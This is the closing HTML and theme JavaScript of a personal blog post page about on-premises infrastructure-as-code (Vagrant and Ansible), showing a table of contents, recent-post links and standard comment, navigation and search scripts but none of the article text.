href="#Why-On-Premises"><span class="toc-number">2.</span> <span class="toc-text">Why On-Premises</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vagrant-Basics"><span class="toc-number">3.</span> <span class="toc-text">Vagrant Basics</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ansible-Basics"><span class="toc-number">4.</span> <span class="toc-text">Ansible Basics</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Building-an-On-Prem-IaC-Workflow"><span class="toc-number">5.</span> <span class="toc-text">Building an On-Prem IaC Workflow</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Security-Concerns-in-On-Prem-IaC"><span class="toc-number">6.</span> <span class="toc-text">Security Concerns in On-Prem IaC</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Attacking-On-Prem-IaC"><span class="toc-number">7.</span> <span class="toc-text">Attacking On-Prem IaC</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-number">8.</span> <span class="toc-text">Conclusion</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/25/Cloud-basedIaCTHM/" title="Cloud-basedIaCTHM">Cloud-basedIaCTHM</a><time datetime="2025-03-24T17:09:39.000Z" title="发表于 2025-03-25 01:09:39">2025-03-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/24/On-PremisesIaCTHM/" title="On-PremisesIaCTHM">On-PremisesIaCTHM</a><time datetime="2025-03-24T14:11:34.000Z" title="发表于 2025-03-24 22:11:34">2025-03-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/24/%E5%85%B3%E4%BA%8E%E6%96%B0%E7%89%88kali%E4%BD%BF%E7%94%A8jdk1.8jar%E5%8C%85%E6%97%B6%E7%9A%84%E5%88%86%E9%85%8D%E9%97%AE%E9%A2%98/" title="关于新版kali使用jdk1.8jar包时的分配问题">关于新版kali使用jdk1.8jar包时的分配问题</a><time datetime="2025-03-24T13:34:18.000Z" title="发表于 2025-03-24 21:34:18">2025-03-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/12/25-2%E6%9D%82%E8%B0%88/" title="25-2杂谈">25-2杂谈</a><time datetime="2025-03-12T02:15:10.000Z" title="发表于 2025-03-12 10:15:10">2025-03-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/03/THMContainerHardening/" title="THMContainerHardening">THMContainerHardening</a><time datetime="2025-03-03T06:59:56.000Z" title="发表于 2025-03-03 14:59:56">2025-03-03</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'https://blog.mikannse.cn/2025/03/24/On-PremisesIaCTHM/'
+    this.page.identifier = '/2025/03/24/On-PremisesIaCTHM/'
+    this.page.title = 'On-PremisesIaCTHM'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
